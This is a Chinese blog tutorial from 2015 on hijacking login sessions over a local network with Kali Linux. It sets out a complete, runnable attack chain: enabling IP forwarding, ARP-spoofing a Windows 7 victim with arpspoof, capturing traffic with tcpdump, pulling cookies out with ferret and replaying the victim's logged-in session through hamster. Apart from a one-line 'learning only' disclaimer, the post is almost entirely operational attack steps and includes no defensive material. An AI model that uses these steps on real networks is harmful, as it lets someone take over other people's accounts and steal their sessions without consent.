title: kali利用Arpspoof、tcpdump、ferret和hamster劫持登录会话
date: 2015-03-25 15:08:23
tags: 
- kali
- 渗透测试
categories: 渗透测试
---
上篇博客讲解了ARP欺骗的原理<http://huirong.github.io/2015/03/25/arp/>，不懂的可以自行google，网上有很多教程。
这次讲解利用ARP欺骗劫持登录会话
<!-- more -->
# I、环境
## ① 拓扑环境
- 攻击机：Kali Linux IP：192.168.1.118
- 受害机：Win7   IP：192.168.1.131
- 网关IP：192.168.1.1
- 攻击工具：arpspoof、tcpdump、ferret、hamster
前三款工具已经集成在Kali中了，ferret需要手动安装
## ② 安装ferret
首先kali 64bit默认不安装ferret，需要自己解决。我之前是apt-get install ferret安装的，执行后会弹出一个对话框，也无法生成hamster.txt，费解多时，因为此ferret非我们需要的ferret。
1. 修改source.list中的内容，如下所示：
```
## Regular repositories
deb http://http.kali.org/kali kali main non-free contrib
deb http://security.kali.org/kali-security kali/updates main contrib non-free
## Source repositories
deb-src http://http.kali.org/kali kali main non-free contrib
deb-src http://security.kali.org/kali-security kali/updates main contrib non-free
```
2. 添加对32为的支持
```
dpkg --add-architecture i386
```
3. 更新
```
apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y
```
4. 先删除原来的ferret
```
aptitude remove ferret
```
5. 安装我们需要的feret
```
aptitude install ferret-sidejack:i386
```
# II、开始攻击
## ① 打开路由转发
```
echo "1" > /proc/sys/net/ipv4/ip_forward
```
linux下开启路由转发功能，可以让linux机器作为一个路由器来工作，将受害主机的数据包发送给网关。如果不开启此功能，受害主机的将会断网，这就是ARP断网攻击。
系统重启后，恢复原来的配置，只是临时生效
## ② ARP欺骗
```
arpspoof -i wlan0 -t 192.168.1.131 192.168.1.1
```
欺骗受害主机192.168.1.131，网关192.168.1.1的MAC地址是攻击机的MAC地址，那么在局域网内，受害主机发送给网关的数据包，都会发送给攻击机
![](https://ww3.sinaimg.cn/large/005CA6ZCjw1eqi3adliqnj30ki0duwi5.jpg)
## ③ 抓取本地数据包
重新打开一个终端，输入：
```
tcpdump -i wlan0 -w hello.cap
```
![](https://ww4.sinaimg.cn/large/005CA6ZCjw1eqi2xbwlwwj30kf0dq75p.jpg)
将抓取到的数据保存到hello.cap文件中
## ④ 耐心等待。。。
此时，需要等待受害主机登录摸个网站，或刷新已经登录过的页面
相当于受害在想网关发送携带了cookie的数据包，我们就是要劫持这个cookie
当刷新完毕后，就可以结束 arpspoof 和 tcpdump
## ⑤ 使用ferret分析抓取的数据包
```
ferret -r hello.cap
```
![](https://ww4.sinaimg.cn/large/005CA6ZCjw1eqi3mc4oycj30kh0dodjl.jpg)
查看根目录，会发现自动生成了hamster.txt文件
## ⑥ hamster架设代理，登录会话
在终端输入
```
hamster
```
![](https://ww4.sinaimg.cn/large/005CA6ZCjw1eqi3mc4oycj30kh0dodjl.jpg)
设置浏览器代理
![](https://ww1.sinaimg.cn/large/005CA6ZCjw1eqi2yqbc8mj30f40iadhm.jpg)
打开hamster
![](https://ww2.sinaimg.cn/large/005CA6ZCjw1eqi2z18sdfj311x0dqtch.jpg)
点击192.168.1.131
左边就是获取的cookie信息，找到合适的，就可以看到受害者的登录信息
![](https://ww3.sinaimg.cn/large/005CA6ZCjw1eqi3096wd6j30m807sdi2.jpg)

OK，攻击完毕啦，本教程仅做学习用途~~~~~~~~~
# III、参考文献
[局域网安全 利用ARP欺骗劫持Cookie](http://www.it165.net/safe/html/201501/1025.html)
[linux开启路由转发功能](http://yuangeqingtian.blog.51cto.com/6994701/1302773)
